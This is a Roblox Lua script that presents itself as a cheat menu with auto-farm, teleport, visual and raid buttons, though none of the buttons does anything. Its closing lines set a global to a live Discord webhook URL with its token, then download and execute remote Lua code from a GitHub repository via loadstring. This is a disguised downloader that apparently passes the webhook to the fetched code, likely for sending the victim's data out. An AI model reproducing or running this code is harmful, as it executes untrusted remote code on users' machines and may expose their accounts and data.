local LepantoIsOP = Instance.new("ScreenGui")
local Background = Instance.new("Frame")
local MainMenu = Instance.new("ImageLabel")
local AutoFarm = Instance.new("TextButton")
local TP = Instance.new("TextButton")
local VISUAL = Instance.new("TextButton")
local MISC = Instance.new("TextButton")
local AutoFarmFrame = Instance.new("Frame")
local no = Instance.new("ImageLabel")

--Properties:

LepantoIsOP.Parent = game.CoreGui

LepantoIsOP.Name = "LepantoIsOP"
LepantoIsOP.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
LepantoIsOP.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
LepantoIsOP.Enabled = true

Background.Name = "Background"
Background.Parent = LepantoIsOP
Background.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Background.BackgroundTransparency = 1.000
Background.BorderSizePixel = 0
Background.Size = UDim2.new(1, 0, 1, 0)

MainMenu.Name = "MainMenu"
MainMenu.Parent = Background
MainMenu.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainMenu.BackgroundTransparency = 1.000
MainMenu.Position = UDim2.new(0.433249384, 0, 0.145620018, 0)
MainMenu.Size = UDim2.new(0.5491184, 0, 0.526734948, 0)
MainMenu.ZIndex = 9999
MainMenu.Image = "http://www.roblox.com/asset/?id=9586613859"
MainMenu.ImageColor3 = Color3.fromRGB(145, 145, 145)

AutoFarm.Name = "Auto Farm"
AutoFarm.Parent = MainMenu
AutoFarm.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AutoFarm.BackgroundTransparency = 0.800
AutoFarm.Position = UDim2.new(0.0126146786, 0, 0.0194384437, 0)
AutoFarm.Size = UDim2.new(0, 141, 0, 41)
AutoFarm.Font = Enum.Font.ArialBold
AutoFarm.Text = "Auto Farm and etc"
AutoFarm.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoFarm.TextScaled = true
AutoFarm.TextSize = 14.000
AutoFarm.TextStrokeTransparency = 0.000
AutoFarm.TextWrapped = true

TP.Name = "TP"
TP.Parent = MainMenu
TP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TP.BackgroundTransparency = 0.800
TP.Position = UDim2.new(0.0126146786, 0, 0.123110145, 0)
TP.Size = UDim2.new(0, 141, 0, 41)
TP.Font = Enum.Font.ArialBold
TP.Text = "Teleport and etc"
TP.TextColor3 = Color3.fromRGB(255, 255, 255)
TP.TextScaled = true
TP.TextSize = 14.000
TP.TextStrokeTransparency = 0.000
TP.TextWrapped = true

VISUAL.Name = "VISUAL"
VISUAL.Parent = MainMenu
VISUAL.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
VISUAL.BackgroundTransparency = 0.800
VISUAL.Position = UDim2.new(0.0126146786, 0, 0.231101528, 0)
VISUAL.Size = UDim2.new(0, 141, 0, 40)
VISUAL.Font = Enum.Font.ArialBold
VISUAL.Text = "Visual"
VISUAL.TextColor3 = Color3.fromRGB(255, 255, 255)
VISUAL.TextScaled = true
VISUAL.TextSize = 14.000
VISUAL.TextStrokeTransparency = 0.000
VISUAL.TextWrapped = true

MISC.Name = "MISC"
MISC.Parent = MainMenu
MISC.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MISC.BackgroundTransparency = 0.800
MISC.Position = UDim2.new(0.0126146786, 0, 0.345572352, 0)
MISC.Size = UDim2.new(0, 141, 0, 41)
MISC.Font = Enum.Font.ArialBold
MISC.Text = "Raid"
MISC.TextColor3 = Color3.fromRGB(255, 255, 255)
MISC.TextScaled = true
MISC.TextSize = 14.000
MISC.TextStrokeTransparency = 0.000
MISC.TextWrapped = true

AutoFarmFrame.Name = "AutoFarmFrame"
AutoFarmFrame.Parent = MainMenu
AutoFarmFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AutoFarmFrame.BackgroundTransparency = 0.800
AutoFarmFrame.Position = UDim2.new(0.215596333, 0, 0, 0)
AutoFarmFrame.Size = UDim2.new(0, 684, 0, 463)

no.Name = "no"
no.Parent = Background
no.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
no.Position = UDim2.new(0.4282116, 0, 0.134243414, 0)
no.Size = UDim2.new(0.559193969, 0, 0.551763475, 0)
no.ZIndex = 0
no.ImageColor3 = Color3.fromRGB(145, 145, 145)

game.StarterGui:SetCore("SendNotification", {
	Title = "Credits";
	Text = "Lepanto#6530 GUI Maker, Lepanto#6530 Scripter.";
	Duration = 30;
})

_G.webhooksdiscord = "https://discord.com/api/webhooks/975588583891144725/sETon0pzQJ7LE52rKDt6hE5msoubRwsYYWeNjVo770a1RU9u_Flp3PW1NvL7V-yTOTSj"

loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
